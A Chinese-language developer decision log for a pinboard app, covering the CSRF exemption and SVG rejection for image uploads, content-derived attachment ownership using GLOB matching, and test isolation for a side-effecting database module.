57. **便签图片：SVG 一律拒，`image/*` 是唯一豁免 JSON Content-Type 的写接口**（2026-10-26 做便签图片时）：两件事是一起定的。图片走不了 JSON —— 二进制塞进 JSON 要 base64，体积涨三分之一，还得整包进内存解析；所以 `POST /api/attachments` 的请求体**直接是图片字节**，`server/auth/middleware.ts` 的 CSRF 检查给它开一条口子：`method === 'POST' && path === '/api/attachments' && ct.startsWith('image/')`。**跨站表单发不出 `Content-Type: image/*`**（能发出来的只有 form-urlencoded / multipart / text-plain 三种），用 fetch 发这个头会触发 CORS 预检、我们又没放行，所以这条口子不会变成 CSRF 洞——**别为了「统一」把它改回 JSON**。另一半是类型判定：一律按魔数（`sniffImage`），**不认后缀、也不信请求头**，并且**明确拒掉 SVG**：SVG 是 XML，同源下里面的 `<script>` 会执行，跟 `data/uploads/` 同源部署等于给自己开一个 XSS 入口。WebP 要按完整魔数验（`RIFF....WEBP`，只看前 4 字节会把随便什么 RIFF 都收下）。

58. **便签图片的归属只能从正文推，别加绑定列**（同一天）：`attachments.note_id` 只是「最后一次被哪条便签引用」的缓存，**唯一真相是 `notes.content` 里有没有 `/api/attachments/<id>`**。`syncNoteAttachments()` 每次正文变化都先把这条便签的图全部解绑、再按引用重绑；`referencedElsewhere()` 用 `content GLOB '*/attachments/<id>[^0-9]*'` 判断「别的便签还引用着」——glob 尾部要求非数字，所以 id 12 不会被 id 123 骗到（`LIKE '%attachments/12%'` 会）。踩到的场景：**整段正文复制到另一条便签**，若按 `note_id` 判归属，删掉原便签会把还在用的图一起删掉；所以 `deleteAttachmentsForNote()` 先查 `referencedElsewhere()`，有人引用就只解绑、不删文件。**别加 `notes.asset_id` 那种双向绑定**（工作区硬规则也禁止），多一份状态就多一处对不上。

59. **单测里 import 服务端模块会顺手打开真实库**（2026-10-26 写 attachments 单测时确认）：`server/db.ts` 是模块级副作用——一 import 就 `new DatabaseSync(DATA_DIR/pinboard.db)` 并跑迁移。所以测「碰库 + 碰盘」的模块（`server/attachments/store.ts`）必须**先 `process.env.PINBOARD_DATA = mkdtempSync(...)` 再 `await import(...)`**：静态 import 会被提升到文件顶部，env 还没设库就开了；同一进程里再 import 别的库模块会拿到同一个句柄，所以这类测试一个文件只测一条路径。纯逻辑那半边（`core.ts`）刻意不碰库不碰盘，才能被普通静态 import 直接测。同理 e2e 一律走 `tests/run.mjs`（它自己把真实库快照到 `%TEMP%`、起隔离实例、跑完删目录）——**任何临时脚本都不许往 `data/pinboard.db` 写测试数据**。
